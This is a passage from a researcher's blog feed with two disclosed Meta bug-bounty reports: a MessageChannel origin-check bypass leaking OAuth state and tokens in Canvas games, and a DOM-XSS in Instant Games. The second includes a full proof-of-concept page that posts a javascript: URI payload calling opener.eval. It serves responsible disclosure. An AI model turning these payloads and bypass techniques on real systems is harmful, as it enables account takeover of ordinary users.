<p><!-- /wp:paragraph --></p>
<p><!-- wp:paragraph --></p>
<p>The <strong>state</strong> parameter actually represent the name of the callback function which would receive the Arbiter("platform/dialog/response") message containing the access_token/code and pass it to the source window that asked for the access_token/code:<br><br><strong>PlatformDialogClient.async:</strong></p>
<p><!-- /wp:paragraph --></p>
<p><!-- wp:code --></p>
<pre class="wp-block-code"><code lang="javascript" class="language-javascript"> function o(a, b, d, e) {
        var f = b.state;
        b.state = d;
        var g = {
            origin: b.redirect_uri
        };
        b.is_canvas === !0 &amp;&amp; (g.is_canvas = "true",
        delete b.is_canvas);
        b.redirect_uri = new (c("URI"))("/dialog/return/arbiter").setSubdomain("www").setFragment(c("QueryString").encode(g)).getQualifiedURI().toString();
        b.display = "async";
        j[d] = {
            callback: e || function() {}
            ,
            state: f
        };
        return p(a, b)
    }</code></pre>
<p><!-- /wp:code --></p>
<p><!-- wp:paragraph --></p>
<p>Notice here that j contains a set of callback functions, the name of the objects are set to "d" variable which is the the <strong>state</strong> in this case ( d was passed to function o and it was randomly generated )<br><br>The trick here is that the attacker would construct a new request to /dialog/oauth endpoint while requesting an access token for a first party application and redirect uri set to <a href="https://facebook.com/dialog/return/arbiter">facebook.com/dialog/return/arbiter</a> and set the state to the leaked one ( also we use the leaked cquick_token to manage to iframe the dialog/oauth endpoint since the page is normally have X-Frame-Options: Deny which would become SAMEORIGIN), in the dialog/oauth response, it would try to send the response to the parent window by calling a parent window function with the access_token/code and the state leaked. <br><br>The parent window once it has received the response, it would assume it's from the request it has initiated which would enforce app_id/client_id ( the app_id of the game owned by the attacker )  however of course the response came from another source. <br><br>The iframe containing the request to get a first-party access_token would be like this:</p>
<p><!-- /wp:paragraph --></p>
<p><!-- wp:code --></p>]]></content><author><name></name></author><category term="Uncategorized" /><summary type="html"><![CDATA[This bug could allow a malicious actor to takeover Facebook/Meta accounts if the user decided to play a Canvas game. The new Canvas on Comet is using Compat to display dialogs( eg OAuth dialogs ) in separate iframes, the process of displaying a dialog is to first receive a message of the type of the dialog ( like oauth ) and then create an iframe hosting apps.facebook.com/compat, then that iframe would communicate with the parent window via cross window messaging and then try to setup a new communication channel by sending a new MessageChannel port ( CometCompatBroker handles that in the parent window ) Once the new channel is established, the parent window would send the dialog uri to the iframe ( like https://apps.facebook.com/dialog/oauth?app_id=1774400339513387&amp;redirect_uri=https://www.facebook.com/dialog/return/arbiter%23is_canvas%3Dtrue%26origin%3D*&amp;display=async&amp;state=fa6a98360231ec&amp;client_id=1774400339513387&amp;is_comet_compat=true&amp;cquick=jsc_c_1p&amp;cquick_token=AQ4d9gLTLArx2JrntAk&amp;ctarget=https%3A%2F%2Fapps.facebook.com ) and then the iframe would make an async request and display the response which should be a dialog.The step of establishing a new communication channel by sharing a MessageChannel Port is crucial since there are no more checks done to messages coming through that MessageChannel and the source is considered trusted. Before using the new communication channel, multiple checks are done to the source or sender of the message ( containing the MessageChannel port ) , CometCompatBroker verifies the origin of the message: CometCompatBroker : setupMessageChannel function: var d = c("getMessageEventString")(a, "compatAction") , e = c("getMessageEventString")(a, "iframeKey"); (this.$CometCompatBroker5 &amp;&amp; i(a.origin) || h(a.origin)) &amp;&amp; d === "CompatSetup" &amp;&amp; e === this.$CometCompatBroker2 &amp;&amp; (this.$CometCompatBroker1 &amp;&amp; this.$CometCompatBroker1.close(), a.ports != null &amp;&amp; Array.isArray(a.ports) &amp;&amp; (this.$CometCompatBroker1 = a.ports[0], this.$CometCompatBroker1.onmessage = this.$CometCompatBroker6, b())) The interesting verification part is: h(a.origin)) &amp;&amp; d === "CompatSetup" &amp;&amp; e === this.$CometCompatBroker2 . So it has two checks, it would verify if iframeKey matches "e" and if the origin is allowed by passing it to function "h"; the first verification could be bypassed by bruteforcing because iframeKey has a unique format js_c_XX where XX can be in the charset [a-z0-9]. function h has this code: var b = d("ConstUriUtils").getUri(a); if (b == null) { c("FBLogger")("comet_infra").mustfix("Failed to parse the origin `%s`", a); return !1 } a = ["apps", "secure", "www"].some(function(a) { a = d("ConstUriUtils").getUri(c("getCompatIframeOrigin")(a)); return a == null ? !1 : b.isSameOrigin(a) }); if (a) return !0; a = d("ConstUriUtils").getUri(document.location.origin.replace(/facebook\.com/i, "messenger.com")); return a ? b.isSameOrigin(a) : !1 Here it creates a new URI object in b, then try to verify the domain. The bypass would be to send the message from a sandboxed iframe which would have the origin set to "null" in that case, d("ConstUriUtils").getUri(a) would return an URI object where protocol, domain , port all equal to null. The check to see if the origin is allowed is done via b.isSameOrigin(a) ; that function has this code:&nbsp; if (this.getProtocol() &amp;&amp; this.getProtocol() !== a.getProtocol()) return !1; if (this.getDomain() &amp;&amp; this.getDomain() !== a.getDomain()) return !1; if (this.getPort() &amp;&amp; this.getPort() !== a.getPort()) return !1; return this.toString() === "" || a.toString() === "" ? !1 : !0 Since b, as we mentioned, has protocol, domain and port undefined, all checks would pass and the final one (this.toString() ) would return "null" and not "". The correct way to use this function is to check if the trusted domain isSameOrigin with the untrusted one : ( a.isSameOrigin(b) instead of b.isSameOrigin(a) ) . Now since the origin check was bypassed and the MessageChannel port sent is being used, we would send this message to the port , {compatAction:"request-loaddialog"} ; the parent window would send back the dialog-url mentioned before , ( check CometCompatModalUniversal.react , j.sendChildFrameParams({ compatAction: "loaddialog", rel: a.params.rel, uri: a.params.uri }) modules for more details) . The dialog url like https://apps.facebook.com/dialog/oauth?app_id=1774400339513387&amp;redirect_uri=https://www.facebook.com/dialog/return/arbiter%23is_canvas%3Dtrue%26origin%3D*&amp;display=async&amp;state=fa6a98360231ec&amp;client_id=1774400339513387&amp;is_comet_compat=true&amp;cquick=jsc_c_1p&amp;cquick_token=AQ4d9gLTLArx2JrntAk&amp;ctarget=https%3A%2F%2Fapps.facebook.com would leak the cquick_token and the state. Now comes the best part! : The state parameter actually represent the name of the callback function which would receive the Arbiter("platform/dialog/response") message containing the access_token/code and pass it to the source window that asked for the access_token/code:PlatformDialogClient.async: function o(a, b, d, e) { var f = b.state; b.state = d; var g = { origin: b.redirect_uri }; b.is_canvas === !0 &amp;&amp; (g.is_canvas = "true", delete b.is_canvas); b.redirect_uri = new (c("URI"))("/dialog/return/arbiter").setSubdomain("www").setFragment(c("QueryString").encode(g)).getQualifiedURI().toString(); b.display = "async"; j[d] = { callback: e || function() {} , state: f }; return p(a, b) } Notice here that j contains a set of callback functions, the name of the objects are set to "d" variable which is the the state in this case ( d was passed to function o and it was randomly generated )The trick here is that the attacker would construct a new request to /dialog/oauth endpoint while requesting an access token for a first party application and redirect uri set to facebook.com/dialog/return/arbiter and set the state to the leaked one ( also we use the leaked cquick_token to manage to iframe the dialog/oauth endpoint since the page is normally have X-Frame-Options: Deny which would become SAMEORIGIN), in the dialog/oauth response, it would try to send the response to the parent window by calling a parent window function with the access_token/code and the state leaked. The parent window once it has received the response, it would assume it's from the request it has initiated which would enforce app_id/client_id ( the app_id of the game owned by the attacker ) however of course the response came from another source. The iframe containing the request to get a first-party access_token would be like this:]]></summary></entry><entry><title type="html">DOM-XSS in Instant Games due to improper verification of supplied URLs</title><link href="http://localhost:4000/uncategorized/2023/01/29/dom-xss-in-instant-games-due-to-improper-verification-of-supplied-urls.html" rel="alternate" type="text/html" title="DOM-XSS in Instant Games due to improper verification of supplied URLs" /><published>2023-01-29T14:04:43+02:00</published><updated>2023-01-29T14:04:43+02:00</updated><id>http://localhost:4000/uncategorized/2023/01/29/dom-xss-in-instant-games-due-to-improper-verification-of-supplied-urls</id><content type="html" xml:base="http://localhost:4000/uncategorized/2023/01/29/dom-xss-in-instant-games-due-to-improper-verification-of-supplied-urls.html"><![CDATA[<p><!-- wp:paragraph {"style":{"typography":{"fontSize":"30px"}}} --></p>
<p style="font-size:30px">
<p><!-- /wp:paragraph --></p>
<p><!-- wp:paragraph --></p>
<p>This bug could allow a malicious actor to takeover Facebook ( and Meta ) accounts after tricking the user to play an Instant Game. This bug happens since the "goURIOnWindow" Module which is widely used in Meta platforms fails to verify the scheme of the supplied URL which means we can supply a javascript URI scheme and achieve DOM-XSS.</p>
<p><!--more--><br />
<!-- /wp:paragraph --></p>
<p><!-- wp:paragraph {"style":{"typography":{"fontSize":"30px"}}} --></p>
<p style="font-size:30px">Details</p>
<p><!-- /wp:paragraph --></p>
<p><!-- wp:paragraph --></p>
<p>The function inside <strong>goURIOnWindow</strong> module has this code</p>
<p><!-- /wp:paragraph --></p>
<p><!-- wp:code --></p>
<pre class="wp-block-code"><code lang="javascript" class="language-javascript">__d("goURIOnWindow", ["ConstUriUtils", "FBLogger", "err"], (function(a, b, c, d, e, f, g) {
    "use strict";
    function a(a, b) {
        var e = typeof b === "string" ? d("ConstUriUtils").getUri(b) : b;
        if (e)
            a.location = e.toString();
        else {
            a = "Invalid URI " + b.toString() + " provided to goURIOnWindow";
            c("FBLogger")("comet_infra").blameToPreviousFrame().mustfix(a)
        }
    }
    g["default"] = a
}
), 98);</code></pre>
<p><!-- /wp:code --></p>
<p><!-- wp:paragraph --></p>
<p><br>It checks if the supplied argument which should be the URL to be passed to window.location is a "String" or not, if it is not then is would just do toString() conversion and set the value to window.location. <br><br>The process here is vulnerable since goURIOnWindow assumes that the value supplied is either a "String" which then would use <strong>ConstUriUtils</strong> to create a "URI" Object and verify it's scheme to be whitelisted <strong>OR</strong> a "URI" Object which must be secure and for that it automatically just convert it to String using toString() which would return "null" in case the scheme is not whitelisted. <br><br>However, it doesn't check if the Object is an instance of the URI object and because of that we can just supply for example an array which contains a javascript URI and it would pass the check.<br>I found out that Instant Games is vulnerable and other places too in the different places in the platform are with attacker controlled input being passed to "goURIOnWindow" without previously converting the input using "ConstUriUtils" or "URI" modules. </p>
<p><!-- /wp:paragraph --></p>
<p><!-- wp:paragraph --></p>
<p>Two modules seemed vulnerable in Instant Games, both are accessible by the attacker since they are handlers for cross window messages received by the iframe window hosting the game:</p>
<p><!-- /wp:paragraph --></p>
<p><!-- wp:paragraph --></p>
<p>- <strong>useInteractivePluginSDKMessageHandler.react</strong>, and exactly "<strong>openurlasync</strong>" message. This one is only available to few games and few type of games like canvas_on_blue/ canvas_on_comet. I didn't invest much time trying to hit this one.</p>
<p><!-- /wp:paragraph --></p>
<p><!-- wp:paragraph --></p>
<p>- <strong>InstantGamesOpenExternalLinkDialog.react</strong>, which is called when a "<strong>showgenericdialogasync</strong>" message is received with request set to "open_external_link". This one is vulnerable too but requires a click. Below the PoC to exploit this one while hosting a game in Instant Games:</p>
<p><!-- /wp:paragraph --></p>
<p><!-- wp:paragraph --></p>
<p><strong>index.html:</strong></p>
<p><!-- /wp:paragraph --></p>
<p><!-- wp:code --></p>
<pre class="wp-block-code"><code lang="markup" class="language-markup"><!DOCTYPE html>
<html>
<body>
<script type="text/javascript">

const display = window.Display;
const OTHER_APP_ID = '<YOUR OTHER APP ID HERE>';
const CUSTOM_DATA = { 'custom_data': 42 };
window.onload = function() {
FBInstant.initializeAsync()
.then(FBInstant.startGameAsync)
};

</script>
<script>

var i = 0;
function fun(e) {

if (i == 5)
window.top.postMessage({"type":"showgenericdialogasync","content":{"data":"{\"url\":[\"javascript:opener.eval('new AsyncRequest(\\\\'/api/graphql/\\\\').setData({doc_id:\\\\'xxxxxxxxxxxxxx\\\\',variables:\\\\'{}\\\\'}).send()');\"]}","request":"open_external_link","sdkVersion":"7.0","promiseID":"showgenericdialogasync_2428951442"},"destination":"fbinstant-ATTACKERAPPID"},"*");

i++;
}

onmessage = (e)=>{f=e.data; if (typeof f !== "string") {fun(e.source)}}
</script>
</body>
</html></code></pre>
<p><!-- /wp:code --></p>
<p><!-- wp:paragraph --></p>
<p><strong>fb-app-config.json:</strong></p>
<p><!-- /wp:paragraph --></p>
<p><!-- wp:code --></p>
<pre class="wp-block-code"><code lang="json" class="language-json">{ "instant_games": { "platform_version": "RICH_GAMEPLAY", "custom_update_templates": { "play_turn": { "example": "Play" } },"navigation_menu_version": "NAV_FLOATING",}}</code></pre>
<p><!-- /wp:code --></p>
<p><!-- wp:paragraph --></p>
<p><strong>javascript:opener.eval('new AsyncRequest(\\\\'/api/graphql/\\\\').setData({doc_id:\\\\'xxxxxxxxxxxxxx\\\\',variables:\\\\'{}\\\\'}).send()');\"]}</strong> would use a Facebook module to make an async request to the GraphQL endpoint.</p>
<p><!-- /wp:paragraph --></p>
<p><!-- wp:paragraph --></p>
<p>Later, Meta confirmed that this was causing DOM-XSS in other places in the Facebook platform and those ones didn't require user interaction. </p>
<p><!-- /wp:paragraph --></p>
<p><!-- wp:paragraph {"style":{"typography":{"fontSize":"30px"}}} --></p>
<p style="font-size:30px"><strong>Timeline</strong></p>
<p><!-- /wp:paragraph --></p>
<p><!-- wp:paragraph --></p>
<p>Oct 24, 2022&mdash; Report Sent <br>Oct 24, 2022&mdash;  Acknowledged by Meta<br>Dec 12, 2022&mdash; Fixed by Meta<br>Dec 13, 2022 &mdash; $62500 bounty with bonuses awarded by Meta. ( although only $28125 was paid here, Meta rules about ATOs <a href="https://www.facebook.com/whitehat/payout_guidelines/account_takeover">https://www.facebook.com/whitehat/payout_guidelines/account_takeover</a> clearly says that XSS that directly leads to ATO should be rewarded $50000 not including additional bonuses, i raised this concern to them and this should be corrected )<br><br> </p>
<p><!-- /wp:paragraph --></p>]]></content><author><name></name></author><category term="Uncategorized" /><summary type="html"><![CDATA[This bug could allow a malicious actor to takeover Facebook ( and Meta ) accounts after tricking the user to play an Instant Game. This bug happens since the "goURIOnWindow" Module which is widely used in Meta platforms fails to verify the scheme of the supplied URL which means we can supply a javascript URI scheme and achieve DOM-XSS. Details The function inside goURIOnWindow module has this code __d("goURIOnWindow", ["ConstUriUtils", "FBLogger", "err"], (function(a, b, c, d, e, f, g) { "use strict"; function a(a, b) { var e = typeof b === "string" ? d("ConstUriUtils").getUri(b) : b; if (e) a.location = e.toString(); else { a = "Invalid URI " + b.toString() + " provided to goURIOnWindow"; c("FBLogger")("comet_infra").blameToPreviousFrame().mustfix(a) } } g["default"] = a } ), 98); It checks if the supplied argument which should be the URL to be passed to window.location is a "String" or not, if it is not then is would just do toString() conversion and set the value to window.location. The process here is vulnerable since goURIOnWindow assumes that the value supplied is either a "String" which then would use ConstUriUtils to create a "URI" Object and verify it's scheme to be whitelisted OR a "URI" Object which must be secure and for that it automatically just convert it to String using toString() which would return "null" in case the scheme is not whitelisted. However, it doesn't check if the Object is an instance of the URI object and because of that we can just supply for example an array which contains a javascript URI and it would pass the check.I found out that Instant Games is vulnerable and other places too in the different places in the platform are with attacker controlled input being passed to "goURIOnWindow" without previously converting the input using "ConstUriUtils" or "URI" modules. Two modules seemed vulnerable in Instant Games, both are accessible by the attacker since they are handlers for cross window messages received by the iframe window hosting the game: - useInteractivePluginSDKMessageHandler.react, and exactly "openurlasync" message. This one is only available to few games and few type of games like canvas_on_blue/ canvas_on_comet. I didn't invest much time trying to hit this one. - InstantGamesOpenExternalLinkDialog.react, which is called when a "showgenericdialogasync" message is received with request set to "open_external_link". This one is vulnerable too but requires a click. Below the PoC to exploit this one while hosting a game in Instant Games: index.html:]]></summary></entry></feed>